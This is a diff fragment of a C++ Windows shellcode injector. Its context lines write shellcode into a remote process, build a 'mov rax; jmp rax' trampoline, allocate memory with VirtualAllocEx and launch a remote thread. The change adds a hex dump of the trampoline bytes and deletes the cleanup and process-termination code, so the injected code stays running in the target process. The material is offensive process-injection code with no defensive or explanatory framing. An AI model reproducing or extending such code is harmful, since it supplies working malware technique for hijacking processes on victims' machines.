@@ -118,6 +118,12 @@ int main(int argc, char** argv) {
     BYTE trampoline[12] = { 0x48, 0xB8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xFF, 0xE0 };
     memcpy(&trampoline[2], &remoteAddrShellCode, 8);
 
+    std::cout << "Trampoline Op Code: ";
+    for (size_t i = 0; i < 12; i++) {
+        std::cout << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(trampoline[i]) << " ";
+    }
+    std::cout << std::dec << "\n";
+
     // allocate memory for trampoline
     LPVOID remoteAddrTrampoline = VirtualAllocEx(hProcess, nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (remoteAddrTrampoline) {
@@ -171,19 +177,6 @@ int main(int argc, char** argv) {
         std::cerr << "Failed to create remote thread: " << GetLastError() << "\n";
         return 1;
 	}
-
-    // cleanup
-    VirtualFreeEx(hProcess, remoteAddrShellCode, 0, MEM_RELEASE);
-    VirtualFreeEx(hProcess, remoteAddrTrampoline, 0, MEM_RELEASE);
-    CloseHandle(hProcess);
-    if (TerminateProcess(pi.hProcess, 0)) {
-        std::cout << "Process terminated.\n";
-    }
-    else {
-        std::cerr << "Failed to terminate process: " << GetLastError() << "\n";
-    }
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
 
     return 0;
 }
